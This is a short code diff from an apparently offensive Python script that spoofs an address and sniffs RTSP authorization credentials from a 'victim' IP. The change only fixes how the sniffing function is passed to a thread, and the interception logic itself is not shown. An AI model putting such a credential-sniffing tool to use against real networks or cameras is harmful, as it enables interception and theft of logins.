@@ -109,7 +109,7 @@ if __name__ == "__main__":
     def sniff():
         sniff_rtsp_authorization(victim_ip, spoof_ip)
 
-    sniff_thread = Thread(target=sniff_rtsp_authorization)
+    sniff_thread = Thread(target=sniff)
     sniff_thread.start()
     sniff_thread.join()
 
